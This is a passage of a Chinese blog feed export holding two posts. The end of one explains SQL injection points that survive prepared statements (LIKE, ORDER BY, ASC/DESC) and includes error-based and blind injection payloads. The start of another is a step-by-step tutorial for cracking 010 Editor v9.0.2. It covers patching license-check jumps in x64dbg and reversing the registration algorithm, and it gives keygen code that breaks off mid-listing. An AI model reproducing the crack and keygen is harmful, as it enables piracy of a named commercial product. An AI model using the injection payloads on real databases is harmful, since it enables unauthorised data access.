感觉用了预编译语句，但又好像没完全用</span><br><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction where name like &#x27;%:username%&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:username&quot;</span>,<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);<br>print_r(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># 关闭链接</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入：<code>username=t</code>，查看数据库日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">21 Connectroot@localhost on sort using TCP/IP<br>21 Prepareselect * from fraction where name like &#x27;%:username%&#x27;<br>21 Executeselect * from fraction where name like &#x27;%:username%&#x27;<br>21 Close stmt<br>21 Quit<br></code></pre></td></tr></table></figure><p>发现这里没有把我们传的<code>username=t</code>绑定到查询语句中去，这是因为在绑定参数时包含％,而不是在SQL本身(预先准备好的语句)中,这是不起作用。所以这种情况下，开发可能会选择直接使用拼接语句，这就给了SQL注入的可能。</p><p>但是，也不是没有办法在使用like的情况下进行预编译，需要调用一些，MySQL的内置函数，例如将上述的查询语句更改为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction where name like concat(&#x27;%&#x27;,:username,&#x27;%&#x27;)<br># 这种情况下就能够进行在使用预编译的情况下进行like模糊查询<br></code></pre></td></tr></table></figure><h5 id="order-by后传入字段名"><a href="#order-by后传入字段名" class="headerlink" title="order by后传入字段名"></a>order by后传入字段名</h5><p>order by 简单用法</p><p><strong>作用</strong>：用于对结果集进行排序。</p><p><strong>语法：</strong>顺序：SELECT * from 表名 ORDER BY 排序的字段名 倒序：SELECT * from 表名 ORDER BY 排序的字段名 DESC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[ORDER BY &#123;col_name | expr | position&#125;  <br>[ASC | DESC], ...]  <br></code></pre></td></tr></table></figure><p><strong>注</strong>：ORDER BY 语句用于根据指定的列对结果集进行排序。ORDER BY 语句默认按照升序对记录进行排序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction order by fraction DESC;# 根据字段fraction进行降序排列<br>select * from fraction order by fraction ASC;# 根据字段fraction进行升序排列<br></code></pre></td></tr></table></figure><p><code>order by</code>位置的注入点，其实跟平常的注入点类似，目前感觉区别不大，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction order by 1 and 1=updatexml(0,concat(&#x27;~&#x27;,user(),&#x27;~&#x27;),1)# asc;-- 报错注入<br>select * from fraction order by updatexml(0,concat(&#x27;~&#x27;,user(),&#x27;~&#x27;),1)# asc;-- 报错注入<br>select * from fraction order by if(1,sleep(3),sleep(0))# asc;-- 延时盲注，但这个延时了33秒，离谱<br>select * from fraction order by if((user()=&#x27;root@localhost&#x27;),fraction,id);# asc;-- 布尔盲注<br></code></pre></td></tr></table></figure><p>ok，回归正题，有时ORDER BY后的表名动态传入的SQL语句；渗透测试中允许用户传入按某个字段进行排序的行为，这很有可能是直接拼接的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$col</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;col&#x27;</span>]; <span class="hljs-comment">// 接收username</span><br><br><span class="hljs-comment"># 建立数据库连接</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// 创建连接,选择数据库,检测连接</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 设置本地预编译，绑定参数</span><br><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction order by :col&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:col&quot;</span>,<span class="hljs-variable">$col</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);<br>print_r(<span class="hljs-variable">$result</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># 关闭链接</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入<code>col=fraction</code>，查看数据库执行日志，能够发现已经成功绑定参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">12 Connectroot@localhost on sort using TCP/IP<br>12 Prepareselect * from fraction order by ?<br>12 Executeselect * from fraction order by &#x27;fraction&#x27;<br>12 Close stmt<br>12 Quit<br></code></pre></td></tr></table></figure><p>但把执行的语句代入数据库命令行中再看，发现这结果不是我们想要的啊</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/12.png"></p><p>这是因为在进行参数绑定的时候，$col的值是一个字符串，在将$col的值绑定进sql语句中后，:col仍然是一个字符串，最终代入数据库进行执行的语句是<code>select * from fraction order by &#39;fraction&#39;</code>，而order by之后需要的是一个表名，这个表名不能以字符串的形式存在。因此，该位置大概率会被写成拼接，这就造成了SQL注入的可能。</p><h5 id="order-by后传入ASC-DESC"><a href="#order-by后传入ASC-DESC" class="headerlink" title="order by后传入ASC/DESC"></a>order by后传入ASC/DESC</h5><p>有时，可能会存在根据用户的选择来进行正序或倒叙排列，而这时如果<code>ASC/DESC</code>是从前端动态传入的，那此处大概率使用的是拼接</p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction order by fraction :asc&quot;</span>);<br></code></pre></td></tr></table></figure><p>当使用PDO，将预处理语句写成这样时，会抛出错误</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/13.png"></p><p>在MySQL命令行中，进行该预处理语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from &quot;select * from fraction order by fraction ?&quot;;<br></code></pre></td></tr></table></figure><p>同样会抛出错误</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;?&#39; at line 1</code></p><p>所以当需要前端传入<code>ASC/DESC</code>时，后端大概率使用的是拼接，用了拼接就造成了SQL注入的可能</p><h4 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h4><p>目前所了解到的基本上就这些，看网上说还有”IN 语句之后”，但是经过测试之后发现<code>IN</code>语句之后能够正常使用预处理，<code>IN</code>语句之后若存在SQL注入的话大概率就是拼接，而拼接的话就跟普通的注入区别不大了，所以就没有写关于<code>IN</code>语句之后的。文章里面估计有一些错误的地方，以及一些没有说清的地方，后面翻看的时候如果发现了就再更新，毕竟现在菜的离谱，写错了也不知道错了；还有就是肯定有一些不能使用预编译或预编译可能存在的问题没有写到，后面如果学习到或者遇到的时候要补充进来的。最后的最后，该去想办法捡点垃圾吃晚饭了</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/14.png"></p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.cnblogs.com/Cyangsec/p/13067369.html">https://www.cnblogs.com/Cyangsec/p/13067369.html</a></p><p><a href="https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f">https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f</a></p><p><a href="https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be">https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be</a></p><p><a href="https://cloud.tencent.com/developer/news/378220">https://cloud.tencent.com/developer/news/378220</a></p><p><a href="https://xz.aliyun.com/t/7132#toc-11">https://xz.aliyun.com/t/7132#toc-11</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>为了多捡点垃圾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>010 Editor 破解</title>
    <link href="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="010-Editor破解"><a href="#010-Editor破解" class="headerlink" title="010 Editor破解"></a>010 Editor破解</h3><p>这篇文章来自于迫于无奈的技术分享，没啥会的，又不能与前面重复，于是乎是能看看网上的教程自己来一遍了。</p><p>可以说是抄的，但也有自己的分析与学习，故记录下来。</p><h4 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h4><h5 id="010Eitor-v9-0-2-64-bit"><a href="#010Eitor-v9-0-2-64-bit" class="headerlink" title="010Eitor v9.0.2 64-bit"></a>010Eitor v9.0.2 64-bit</h5><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ul><li>exeinfope (查壳)</li><li>Xdbg (动态调试)</li><li>IDA (静态分析)</li><li>PyCharm (编写注册机)</li></ul><h4 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2. 暴力破解"></a>2. 暴力破解</h4><p>一般的破解，就是通过更改一些关键跳转，将本来指向错误的位置进行更改，使其指向正确的位置，从而跳过验证，使软件在进行验证时会直接走向成功；或者说，软件的注册码是根据用户名进行一个计算，最终得到一个注册码，这种可以通过输入用户名，然后在最后进行对比时获取得到该用户名的注册码，这样同样能够实现破解的效果。</p><h5 id="1）破解思路"><a href="#1）破解思路" class="headerlink" title="1）破解思路"></a>1）破解思路</h5><ul><li>查壳，有壳脱壳，无壳跳过</li><li>确定注册算法位置</li><li>找寻关键跳转，并将其更改指向成功位置</li><li>打包更改后的文件</li></ul><h5 id="2）破解过程"><a href="#2）破解过程" class="headerlink" title="2）破解过程"></a>2）破解过程</h5><p>从<a href="https://www.sweetscape.com/download/previous/">010Ediror官网</a>下载v9.0.2版本，然后安装，这里本来是想找v9.0.1版本的(因为教程上面是v9.0.1)，但苦于官网没有找到，所以只能下v9.0.2的了，但这两个实际上没啥区别。安装好之后，将安装好之后的可执行文件(可不是安装包)拖入exeinfope进行查壳</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/1.png"></p><p>可以看到程序无壳。可以直接附加到xdbg中进行分析</p><p>由于010Editor在Check License，当注册码不对时，会提示错误信息，所以这里可以采用字符串进行定位</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/2.png"></p><p>使用xdbg Alt+A将程序附加进来</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/3.png"></p><p>右键-搜索-所有模块-字符串，然后搜索刚刚报错页面上的字符串</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/4.png"></p><p>双击进入该函数，上下翻翻能够发现该函数不止有刚刚的错误信息，还有”Thank you for purchasing 010 Editor!”</p><p>所以基本上可以确定该函数就是Check License处的关键函数，在该函数头处下断点，然后点击Check License，能够发现EIP已经跳转至该位置：</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/5.png"></p><p>F8单步走一遍该函数，能够发现，在错误的注册码情况下，能够发现程序有两个关键性的跳转</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/6.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/7.png"></p><p>在程序正常执行下，在走到0x13FAF7AC2位置处，会直接跳转到0x13FAF7BB5处，此时ebx的值又不为0xDB，所以会继续进行跳转，并直接跳转到注册码错误位置，所以基本可以判定这两个跳转就是关键性的。此处发信啊” Thank you for purchasing 010 Editor!”这个字符串在第二个跳转后面，所以可以将0x13FAF7BBB处的jne使用nop进行注释掉</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/8.png"></p><p>F8继续单步执行，能够发现010Editor已经走到成功的位置</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/9.png"></p><p>此时基本ok，让程序跑起来，发现显示注册成功。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/10.png"></p><p>将修改之后的程序进行进行保存，ctrl+P，修改补丁，全选之后点击保存</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/11.png"></p><p>将保存的可执行文件放到010Editor的安装目录下(因为程序在执行的时候会调用一些其他文件)，然后即可实现破解</p><p>这样子破解的话，是存在一个问题的，就是在每一次打开010Editor的时候，都会让先进行注册码的校验，然后才能进入软件，其实没什么影响，但是看起来总归是有点不完美，所以需要找进行新一轮的尝试，捋一下刚刚的思路：</p><blockquote><p>有两个关键的跳转，一个是  cmp esi,E7  判断ESI是否为0xE7，不是则跳；另一个是 cmp ebx,DB，判断EBX是否为0xDB，不是则跳转，刚刚将cmp ebx,DB后面的跳转nop掉，使得破解成功。因此可以尝试控制EBX的值，让EBX=0xDB，这样程序可能就走不到弹出效验注册码的页面了，因为在打开程序时，程序内部校验发现已经注册成功，所以就不会跳到效验注册码的页面中了（猜测）。</p></blockquote><p>OK，回到程序，寻找控制EBX的位置，由于程序是经过两个跳转之后直接跳到验证码错误的位置，所以应该在第一个跳转前寻找控制ebx值的位置。这里有一点需要注意的是，EAX常用作函数返回值的存储，简单点说就是 return 1时，函数执行结束后，eax=1</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/12.png"></p><p>这里调用了两个函数，一个确定ESI，另一个确定EBX，将程序走到0x13FE97AC2，然后F7步入，发现调用的010Editor.1402B4820函数，跟进，将该函数走一遍</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/13.png"></p><p>发现该函数在0x1402B4861位置处将eax的值与0xE7进行比较，在错误的验证码情况下，此处会直接跳走</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/14.png"></p><p>跳到0x1402B48DC处，此处对eax进行一个赋值，赋值结束后直接函数结束了。然后回到刚刚的那个函数中，开始进行对比跳转。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/15.png"></p><p>由于我们需要EBX的值为0xDB，而<code>EBX=EAX</code>，EAX的值又是010Editor.1402B4820函数返回的，所以，我们可以在0x1402B48DC处将原本的<code>mov eax,177</code>更改为<code>mov eax,DB</code>，这样就可以满足<code>EBX=0xDB</code>。OK，选中该行-空格，然后将0x177更改为0xDB，然后确定</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/16.png"></p><p>更改完之后让程序跑起来，显示成功</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/17.png"></p><p>再将修改之后程序进行打包，保存到010Editor的安装目录中，尝试打开，能够发现已经不再需要Check License了</p><h4 id="3-算法分析"><a href="#3-算法分析" class="headerlink" title="3.算法分析"></a>3.算法分析</h4><p>通过前面的破解过程，基本可以判定确定ESI和EBX值的那两个函数就是我们想要找的注册算法函数，所以后面将着重分析这两个函数的内容。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/18.png"></p><p>首先对010editor.13F0C3F99进行分析，此处调用的是010Editor.140AB3F20函数，初步分析后，得出该函数，先对输入做了空检查，然后读取name和password，将password变为16进制并存储在内存中。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/19.png"></p><p>存储为16进制之后，原本输入的20位注册码现在就相当于是10组数据，将其看成一个数组k[10]。继续往下，程序读取了几组数据准备进行运算。然后对k[3]位置的值进行了一个三次比较。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/20.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/21.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/22.png"></p><p>所以可以猜测k[3]位置处存放的是一个注册码的版本，分别对应0x9C、0xFC、0xAC这三个版本，此处选用0x9C这个版本进行分析，有一个有意思的事情是，当把k[3]位置处更改为9C时，注册码就变成了8组（让程序处于脱离状态，要不然可能会有断点影响）</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/23.png"></p><p>这里将注册码输入为0123-459C-6789-ABCD，为方便后面的在内存中寻找，将程序运行，走到010Editor.140AB3F20函数里面。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/24.png"></p><p>注意图中箭头所指函数，当从执行完该函数后，注意看栈空间，注册码已经被保存到栈中，可以转到内存窗口中用于后续查看输入的注册码是否有变化。继续往下走，对于一些与注册码没有关系的操作可以适当进行忽略，因为认真分析那些可能没有什么用，需要寻找关键点进行分析。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/25.png"></p><p>有个跳转，但是跟进看了之后发现跟注册码貌似没什么关系，并且程序不会跳走，会继续执行，所以忽略。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/26.png"></p><p>这里先是将k[6]、k[5]、k[2]、k[1]、k[3]的值取出并存入寄存器中，k[3]用户确定注册码的版本，其余的解用于下面的计算，在确定了注册码版本之后，将k[0]取出存入ecx中，后面就是一系列的操作了，走到第一个call位置，这里直接使用IDA进行分析，看的更清楚一些。</p><p>使用IDA找到这个函数，这里有一点需要注意的是，xdbg是动态调试，IDA是静态分析，所以导致程序在他们两个中的基址可能是不相同的，所以需要更该IDA的基址，先在xdbg中alt+E查看程序基址</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/27.png"></p><p>再到IDA中 Edit-Segment-Rebase program，将在xdbg中得到的基址填入确定就可以了</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/28.png"></p><p>OK，回到正题，双击第一个call位置，能够看到函数真正的位置为010editor.140AB3200，在IDA函数窗口中搜索140AB3200，然后F5反编译，能够发现该函数很简单，只是进行了异或、加的运算。这里需要注意的是CX通常用来传参，所以a1=CX，根据上面的分析，已知cl = k[0]^k[6]，所以a1=cx=cl=k[0]^k[6]。这个函数简单点说就是对k[0]、k[6]的一个操作</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/29.png"></p><p>回到xdbg，看一下第一个call和第二个call之间的内容，就是将函数的值存储到内存中，在转到地址窗口，后面会用到这个值。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/30.png"></p><p>继续向下分析，看第二个call，双击查看函数地址为010editor.140AB3170，然后用IDA找到，F5反编译，已知cx作为函数传参，而<code>ecx=ebx=(0x100*(k[1]^k[7])+(k[2]^k[5])</code>，也就是相当于把k[1]、k[2]、k[5]、k[7]计算的结果带入这个函数。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/31.png"></p><p>该函数就是对k[1]、k[2]、k[5]、k[7]的值进行一个计算，然后计算余数，当余数为0时返回商，余数不为0时返回0</p><p>看网上的文章说到这里可以建一个注册机模型，但还需要继续往下分析，因为有两处关键点需要进行分析</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/32.png"></p><p>第一个关键点是这里有一个跳转，跳转前面是<code>test ebx,ebx</code>判断ebx的值是否为0，为0则跳转。而ebx的值是第一个call计算出来的，所以此处还以判断第一个call需要返回一个大于0的值。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/33.png"></p><p>第二处关键位置是上图中的<code>cmp eax 0x3E7</code>，此处需要满足eax大于0x3E7才能保证不跳转，而eax又是第二个call返回的。到这里后可以构建一个简单注册机模型用于满足je和ja这两处关键的跳转，该模型只是通过穷举的思路来满足跳转(参考大佬的，要是我肯定是从0x00跑到0xff)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-comment"># 使用随机数来产出符合要求的注册码</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    k = [<span class="hljs-number">0x01</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0xcd</span>] <span class="hljs-comment"># 定义一个长度为8的数组，k[3]=0x9c</span><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        k0 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k6 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        al = (k0 ^ k6 ^ <span class="hljs-number">0x18</span> + <span class="hljs-number">0x3D</span>) ^ <span class="hljs-number">0xA7</span><br>        <span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0</span>):           <span class="hljs-comment"># 根据je跳转</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        k1 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k7 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k2 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k5 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br><br>        esi = (<span class="hljs-number">0x100</span> * (k1 ^ k7 &amp; <span class="hljs-number">0xFF</span>) + k2 ^ k5 &amp; <span class="hljs-number">0xFF</span>) &amp; <span class="hljs-number">0xFFFF</span><br>        eax = (((esi ^ <span class="hljs-number">0x7892</span>) + <span class="hljs-number">0x4d30</span>) ^ <span class="hljs-number">0x3421</span>) &amp; <span class="hljs-number">0xffff</span><br>        <span class="hljs-keyword">if</span>(eax % <span class="hljs-number">0xb</span> ==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> eax/<span class="hljs-number">0xb</span> &lt;=<span class="hljs-number">0x3e8</span>):      <span class="hljs-comment"># 根据ja跳转</span><br>            k[<span class="hljs-number">1</span>] = k1<br>            k[<span class="hljs-number">7</span>] = k7<br>            k[<span class="hljs-number">2</span>] = k2<br>            k[<span class="hljs-number">5</span>] = k5<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%x%x-%x%x-%x%x-%x%x&quot;</span>%(k[<span class="hljs-number">0</span>],k[<span class="hljs-number">1</span>],k[<span class="hljs-number">2</span>],k[<span class="hljs-number">3</span>],k[<span class="hljs-number">4</span>],k[<span class="hljs-number">5</span>],k[<span class="hljs-number">6</span>],k[<span class="hljs-number">7</span>]))<br><br><span class="hljs-keyword">if</span>(__name__ == <span class="hljs-string">&quot;__main__&quot;</span>):<br>    main()<br></code></pre></td></tr></table></figure><p>继续往下分析，将程序运行到<code>cmp eax 0x3E7</code>位置，修改eax的值，保证下面的ja不跳转，然后一直往下走，走到如下图位置，读取用户名，因为在上面对注册码计算时，没有对用户名进行任何操作，所以接下来应该是对用户名进行一个操作了。同时要注意接下来的call，下面的可能是对用户名进行一个操作。</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/34.png"></p><p>跟进，步入函数，同时使用IDA查看该函数，发现该函数共接收4个参数，这里可以回看一下上面的在进入<code>call 010editor.13FF97FD6</code>之前，先后向rcx,rd9,rd8,edx中传入参数。</p><p>已知在64位汇编中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，所以这里向这四个寄存器传入的值，就是传进的参数，但是这里IDA反编译出来的结果，顺序好像有点对不上</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/35.png"></p><p>不过问题不大，可以对照xdbg，判断出a1,a2,a3,a4的值</p><p>这里先看一下传入各个寄存器的值</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/36.png"></p><p>进过对比分析后得出</p><blockquote><p>a1=用户名</p><p>a2=1</p><p>a3=0</p><p>a4=商，也就是前面一个函数的返回值</p></blockquote><p>继续往下分析，该函数先是计算了一下用户名的长度，若用户名长度不为0则对一些变量进行赋值操作</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/37.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/38.png"></p><p>这里，就是根据用户名、再配合上dword_1420750E0这个数据进行一个计算，将值保存到v4中，然后返回，这里看一下dword_1420750E0这个数组，没啥看的，一堆数字</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/39.png"></p><p>这里需要做的是导出这段数据，因为接下来计算注册码时一定能够使用到。这里看网上的是用OD插件导出，导出的数据很完美，奈何我的OD用不了，挂载不了010Editor的程序，所以只能被迫使用IDA,导出数据，导出的数据是10进制的，然后还有点不完美，不过不影响，稍微更改一下就可以用了，选中该数据，shift+e，导出数据即可</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/40.png"></p><p>继续往下走，该函数根据用户名和商计算出一个值，然后与输入的注册码的k[4]、k[5]、k[6]、k[7]比较，后面将k[0]和看k[6]的计算结果与0xA进行了一个比较<code>cmp eax,dword ptr ds:[rdi+2C]</code></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/41.png"></p><p>所以就需要修改刚刚的注册机模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0</span>):           <span class="hljs-comment"># 根据je跳转</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br>            <br><span class="hljs-comment"># 更改为</span><br><span class="hljs-keyword">if</span>(al&gt;<span 